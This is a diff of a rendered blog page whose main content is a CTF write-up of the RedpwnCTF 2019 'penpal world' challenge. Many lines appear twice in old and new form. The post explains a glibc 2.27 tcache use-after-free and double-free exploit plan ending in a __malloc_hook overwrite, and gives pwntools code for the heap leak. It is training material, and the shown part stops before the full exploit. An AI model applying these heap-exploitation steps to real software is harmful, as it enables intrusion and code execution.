       <div class="profile-block text-center">
         <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
-          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
         </a>
         <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
         <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
       </div>
       
       <div class="search" id="search-form-wrap">
@@ -82,23 +85,23 @@
         <div class="input-group">
             <input type="text" class="search-form-input form-control" placeholder="Search" />
             <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
             </span>
         </div>
     </form>
     <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
 </div>
+
 
 </div>
       <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
@@ -108,14 +111,14 @@
         <span class="icon-bar"></span>
       </button>
     </div>
-    <nav id="main-navbar" class="collapse navbar-collapse">
-      <ul class="nav navbar-nav main-nav">
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
         
         
         <li class="menu-item menu-item-home">
           <a href="/.">
             
-            <i class="fa fa-fw fa-home"></i>
+            <i class="icon icon-home-fill"></i>
             
             <span class="menu-title">Home</span>
           </a>
@@ -125,7 +128,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives">
             
-            <i class="fa fa-fw fa-archive"></i>
+            <i class="icon icon-archives-fill"></i>
             
             <span class="menu-title">Archives</span>
           </a>
@@ -135,7 +138,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories">
             
-            <i class="fa fa-fw fa-folder"></i>
+            <i class="icon icon-folder"></i>
             
             <span class="menu-title">Categories</span>
           </a>
@@ -145,19 +148,9 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags">
             
-            <i class="fa fa-fw fa-tags"></i>
+            <i class="icon icon-tags"></i>
             
             <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-competitions">
-          <a href="/competitions">
-            
-            <i class="fa fa-fw fa-flag"></i>
-            
-            <span class="menu-title">Competitions</span>
           </a>
         </li>
         
@@ -165,47 +158,37 @@
         <li class="menu-item menu-item-about">
           <a href="/about">
             
-            <i class="fa fa-fw fa-users"></i>
+            <i class="icon icon-users"></i>
             
             <span class="menu-title">About</span>
           </a>
         </li>
         
       </ul>
-      <div class="footer">
-	
+      
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
         
     </ul>
-    
-    <div class="copyright">
-        &copy; 2022 TEAMROCKETIST
-        <div class="publishby">
-        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.-->
-        </div>
-    </div>
-</div>
+
     </nav>
   </div>
-</section>
+</header>
 
   
-    <section class="sidebar">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
   <div class="slimContent">
     
       <div class="widget">
     <h3 class="widget-title">Board</h3>
     <div class="widget-body">
         <div id="board">
-            
             <div class="content">
                 <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
             </div>
@@ -263,7 +246,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
               </p>
               <p class="item-title">
                 <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
@@ -278,7 +261,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
@@ -308,7 +291,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
@@ -341,14 +324,15 @@
 
     
   </div>
-</section>
+</aside>
 
   
-  <section class="main">
+  
+<main class="main" role="main">
   <div class="content">
-  <article id="post-Pwn-RedpwnCTF-penpal-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-RedpwnCTF-penpal-world" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-    <header class="article-header">
+    <div class="article-header">
       
         
   
@@ -360,51 +344,54 @@
       
       <div class="article-meta">
         <span class="article-date">
-    <i class="fa fa-calendar-check-o"></i>
+    <i class="icon icon-calendar-check"></i>
 	<a href="/2019/08/17/Pwn-RedpwnCTF-penpal-world/" class="article-date">
 	  <time datetime="2019-08-17T03:16:39.000Z" itemprop="datePublished">2019-08-17</time>
 	</a>
 </span>
         
   <span class="article-category">
-    <i class="fa fa-folder"></i>
+    <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/x64/">x64</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/">Glibc Malloc</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/">Tcache</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/">tcache_dup</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/">tcache_poisoning</a>
   </span>
 
         
   <span class="article-tag">
-    <i class="fa fa-tag"></i>
+    <i class="icon icon-tags"></i>
 	<a class="article-tag-link" href="/tags/double-free/">double_free</a>, <a class="article-tag-link" href="/tags/heap/">heap</a>, <a class="article-tag-link" href="/tags/redpwnctf2017/">redpwnctf2017</a>, <a class="article-tag-link" href="/tags/tcache-poisoning/">tcache_poisoning</a>, <a class="article-tag-link" href="/tags/use-after-free/">use_after_free</a>
   </span>
 
 
         
 
-		
-        <span class="post-comment"><i class="fa fa-commenting-o"></i> <a href="/2019/08/17/Pwn-RedpwnCTF-penpal-world/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/08/17/Pwn-RedpwnCTF-penpal-world/#comments" class="article-comment-link">Comments</a></span>
         
-		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 3,553 (words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3,565(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs">Read Time: 22 (min)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 22(minutes)</span>
 	
 
       </div>
-    </header>
-    <div class="article-entry" itemprop="articleBody">
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
 <p>penpal world</p>
 </blockquote>
 <blockquote>
-<p><strong>Description</strong>:<br>436</p>
+<p><strong>Description</strong>:<br>
+436</p>
 <p>Written by: jespiron</p>
 <p>Please don’t decimate this cute lil ish; write your grandmother a smol parcel of love instead~</p>
-<p>nc chall2.2019.redpwn.net 4010<br><a href="https://mega.nz/#!r6o03YgS!a9EjWEernGYNGeWjmQZorIkwrk1C0EhdkezMu4w9-3E" target="_blank" rel="noopener">penpal_world</a><br><a href="https://mega.nz/#!myg22IDT!BIF24BAOo9TeH6fUTggyTUY2KhOq19HBRFWhERXChYA" target="_blank" rel="noopener">libc-2.27.so</a></p>
+<p>nc <a href="http://chall2.2019.redpwn.net" target="_blank" rel="noopener">chall2.2019.redpwn.net</a> 4010<br>
+<a href="https://mega.nz/#!r6o03YgS!a9EjWEernGYNGeWjmQZorIkwrk1C0EhdkezMu4w9-3E" target="_blank" rel="noopener">penpal_world</a><br>
+<a href="https://mega.nz/#!myg22IDT!BIF24BAOo9TeH6fUTggyTUY2KhOq19HBRFWhERXChYA" target="_blank" rel="noopener">libc-2.27.so</a></p>
 </blockquote>
-<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>From the challenge is provided its <strong>binary</strong> and <strong>libc</strong>.<br>Lets first extract some information:</p>
+<h3 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h3>
+<p>From the challenge is provided its <strong>binary</strong> and <strong>libc</strong>.<br>
+Lets first extract some information:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file penpal_world</span><br><span class="line">penpal_world: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped</span><br></pre></td></tr></table></figure>
 <p>With <strong>file</strong> command we now know:</p>
 <ul>
@@ -421,33 +408,56 @@
 <li>The Stack is not executable (We can’t execute shellcode techniques like <strong>ROP</strong> can bypass this)</li>
 <li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li>
 </ul>
-<h3 id="Running-the-binary"><a href="#Running-the-binary" class="headerlink" title="Running the binary"></a>Running the binary</h3><p>Lets first run the binary to see how it works</p>
-<p>We are presented with a menu where we can create,edit,discard and read a postcard:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./penpal_world</span><br><span class="line">OPTIONS</span><br><span class="line">1) Create a postcard</span><br><span class="line">2) Edit a postcard</span><br><span class="line">3) Discard a postcard</span><br><span class="line">4) Read a postcard</span><br></pre></td></tr></table></figure></p>
-<h3 id="Analysing-the-binary-for-a-vulnerability"><a href="#Analysing-the-binary-for-a-vulnerability" class="headerlink" title="Analysing the binary for a vulnerability"></a>Analysing the binary for a vulnerability</h3><p>Using ida to check on the main loop:<br><a data-fancybox="gallery" href="https://i.imgur.com/qwc5RCS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qwc5RCS.png" alt><br></a></p>
-<p>Lets check <strong>create_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0EbIyy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0EbIyy.png" alt><br></a><br><strong>edit_card</strong> time:<br><a data-fancybox="gallery" href="https://i.imgur.com/bcLTouv.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bcLTouv.png" alt><br></a><br>The vulnerability is in <strong>discard_card</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/uZr1mzH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uZr1mzH.png" alt><br></a><br><strong>display</strong> function doesn’t have anything special it does control the indexes and you can print the cards as well.</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>First we need to check which <strong>libc</strong> version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using <strong>libc-2.27</strong> since version <strong>2.26</strong> it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist. </p>
-<p>Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins. </p>
+<h3 id="running-the-binary"><a class="markdownIt-Anchor" href="#running-the-binary"></a> Running the binary</h3>
+<p>Lets first run the binary to see how it works</p>
+<p>We are presented with a menu where we can create,edit,discard and read a postcard:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./penpal_world</span><br><span class="line">OPTIONS</span><br><span class="line">1) Create a postcard</span><br><span class="line">2) Edit a postcard</span><br><span class="line">3) Discard a postcard</span><br><span class="line">4) Read a postcard</span><br></pre></td></tr></table></figure>
+<h3 id="analysing-the-binary-for-a-vulnerability"><a class="markdownIt-Anchor" href="#analysing-the-binary-for-a-vulnerability"></a> Analysing the binary for a vulnerability</h3>
+<p>Using ida to check on the main loop:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/qwc5RCS.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/qwc5RCS.png" alt><br>
+</a></p>
+<p>Lets check <strong>create_card</strong>:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/I0EbIyy.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/I0EbIyy.png" alt><br>
+</a><br>
+<strong>edit_card</strong> time:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/bcLTouv.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/bcLTouv.png" alt><br>
+</a><br>
+The vulnerability is in <strong>discard_card</strong>:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/uZr1mzH.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/uZr1mzH.png" alt><br>
+</a><br>
+<strong>display</strong> function doesn’t have anything special it does control the indexes and you can print the cards as well.</p>
+<h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h3>
+<p>First we need to check which <strong>libc</strong> version is used on the server, since we are provided with the libc file from the challenge, we know that it’s using <strong>libc-2.27</strong> since version <strong>2.26</strong> it implements the tcache concept that is used to cache free chunks in the heap before adding them to the libc freelist.</p>
+<p>Now all heap chunks of size &lt; 0x410 are treated as tcache chunks. When freed they go into their respective tcache bins.</p>
 <p>The good thing about this unlike normal chunks and luckly in this libc version there is <strong>no</strong> security checks making it easier to exploit. Thus we can double free and malloc without any <strong>size</strong> checks.</p>
 <p>The exploit plan is the following one:</p>
 <ul>
 <li>Leak the heap address by reading the fd pointer after freeing;</li>
 <li>Find a way to overwrite the size of a chunk to 0x91 (so when we free it it goes to unsorted bin instead);</li>
 <li>Fill the tcache unsorted tcache bin list (max 7);</li>
-<li>After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc; </li>
+<li>After tcache unsorted bin is full the next free will put into a normal unsorted bin with that we can leak libc;</li>
 <li>Tricking malloc() into returning the address of __malloc_hook ;</li>
 <li>Overwrite __malloc_hook with the address of a one gadget ;</li>
 <li>Trigger the hook using malloc()!</li>
 </ul>
-<h3 id="Setting-up-the-environment-for-pwn-ctf-challenges"><a href="#Setting-up-the-environment-for-pwn-ctf-challenges" class="headerlink" title="Setting up the environment for pwn ctf challenges"></a>Setting up the environment for pwn ctf challenges</h3><p>Now there is a small problem, if you want to debug the binary with the right <strong>libc version</strong> you either find the right linux docker container that uses that version that libc as default or you <strong>LD_PRELOAD</strong> it, to do it you need to compile that specific version. </p>
+<h3 id="setting-up-the-environment-for-pwn-ctf-challenges"><a class="markdownIt-Anchor" href="#setting-up-the-environment-for-pwn-ctf-challenges"></a> Setting up the environment for pwn ctf challenges</h3>
+<p>Now there is a small problem, if you want to debug the binary with the right <strong>libc version</strong> you either find the right linux docker container that uses that version that libc as default or you <strong>LD_PRELOAD</strong> it, to do it you need to compile that specific version.</p>
 <p>for example to do this manually:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.27.so ./<span class="built_in">test</span></span><br><span class="line">LD_PRELOAD=./libc.so.6 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
 <p>Or using pwntools</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process([<span class="string">"/path/to/ld.so"</span>, <span class="string">"./test"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/path/to/libc.so.6"</span>&#125;)</span><br></pre></td></tr></table></figure>
-<p>Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is libc-2.27.so the one we need. </p>
-<p>The github link: <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a><br>The docker hub link: <a href="https://hub.docker.com/r/skysider/pwndocker" target="_blank" rel="noopener">https://hub.docker.com/r/skysider/pwndocker</a></p>
-<p>I don’t recommend going with the <strong>LD_PRELOAD</strong> way, sure you can debug it with the right version but remember this, some <strong>offsets</strong> when leaking libc will be different from the server ones because you’re preloading it with the <strong>ld.so</strong>, if you choose to go this way remember to adapt those offsets to the right ones.</p>
-<h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>This the structure of of a chunk:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start</span><br><span class="line">|          PREV_SIZE OR USER DATA       |</span><br><span class="line">+---------------------------------+-+-+-+</span><br><span class="line">| CHUNK SIZE                      |A|M|P|</span><br><span class="line">+---------------------------------+-+-+-+ </span><br><span class="line">|           FORWARD POINTER(FD)         | &lt;-- All freechunks</span><br><span class="line">|            BACK POINTER(BK)           | &lt;-- normalchunk or larger</span><br><span class="line">|   NEXT BIGGER POINTER (fd_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">|   PREVIOUS SMALLER PTR(bk_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">| -  -  -  -  -  -  -  -  -  -  -  -  - | &lt;-- End of this chunk.</span><br><span class="line">|               PREV_SIZE               |</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure></p>
-<p>The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is <strong>free()</strong>‘d, it sets its <strong>FD pointer</strong> to NULL because there wasn’t any freed item yet, if we free a second item the <strong>FD pointer</strong> will be set to the previous chunk freed, by using <strong>UAF</strong> vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this.</p>
+<p>Luckily someone did the dirty work for us, this docker container contains multiple compiled libcs and also the default libc coming with the system is <a href="http://libc-2.27.so" target="_blank" rel="noopener">libc-2.27.so</a> the one we need.</p>
+<p>The github link: <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a><br>
+The docker hub link: <a href="https://hub.docker.com/r/skysider/pwndocker" target="_blank" rel="noopener">https://hub.docker.com/r/skysider/pwndocker</a></p>
+<p>I don’t recommend going with the <strong>LD_PRELOAD</strong> way, sure you can debug it with the right version but remember this, some <strong>offsets</strong> when leaking libc will be different from the server ones because you’re preloading it with the <strong><a href="http://ld.so" target="_blank" rel="noopener">ld.so</a></strong>, if you choose to go this way remember to adapt those offsets to the right ones.</p>
+<h3 id="leak-heap-address"><a class="markdownIt-Anchor" href="#leak-heap-address"></a> Leak heap address</h3>
+<p>This the structure of of a chunk:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start</span><br><span class="line">|          PREV_SIZE OR USER DATA       |</span><br><span class="line">+---------------------------------+-+-+-+</span><br><span class="line">| CHUNK SIZE                      |A|M|P|</span><br><span class="line">+---------------------------------+-+-+-+ </span><br><span class="line">|           FORWARD POINTER(FD)         | &lt;-- All freechunks</span><br><span class="line">|            BACK POINTER(BK)           | &lt;-- normalchunk or larger</span><br><span class="line">|   NEXT BIGGER POINTER (fd_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">|   PREVIOUS SMALLER PTR(bk_nextsize)   | &lt;-- Only if largechunk</span><br><span class="line">| -  -  -  -  -  -  -  -  -  -  -  -  - | &lt;-- End of this chunk.</span><br><span class="line">|               PREV_SIZE               |</span><br><span class="line">+---------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is <strong>free()</strong>'d, it sets its <strong>FD pointer</strong> to NULL because there wasn’t any freed item yet, if we free a second item the <strong>FD pointer</strong> will be set to the previous chunk freed, by using <strong>UAF</strong> vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this.</p>
 <p>Some introductory stuff we can add I’m using <strong>pwntools</strong> which is a very handy framework for <strong>pwn</strong> you can find it at <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure>
 <p>Since <strong>PIE</strong> is enabled we need to get its base address, to debug it in gdb we can use this function to do it:</p>
@@ -457,67 +467,113 @@
 <p>If you’re using <strong>gdb.attach</strong> from pwntools and you’re inside a docker container remember it won’t detect the terminal to open the specific <strong>gdb window</strong>, we can use tmux for example but we need to specified it by doing this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">	debug([<span class="number">0xb11</span>])</span><br></pre></td></tr></table></figure>
 <p>Open two windows logged in the docker container, the 1st one run your script and on the 2nd one open tmux, when running the script <strong>gdb</strong> will automaticity open with the specified breakpoints we set in the debug list:</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/yxHU7rd.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/yxHU7rd.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/yxHU7rd.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/yxHU7rd.png)
+</a>
 <p>Now that we can debug and open gdb in a very easy way it’s time to write the functions to add,free,edit and print:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br></pre></td></tr></table></figure>
 <p>To leak an address we can for example allocate a chunk and then double free it, we then proceed to read its fd pointer which will point to the first freed chunk, this chunks will be inserted into a tcache bin due to its size of 0x48.</p>
-<p>Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>Gdb output:<br><a data-fancybox="gallery" href="https://i.imgur.com/brUzymx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/brUzymx.png" alt><br></a></p>
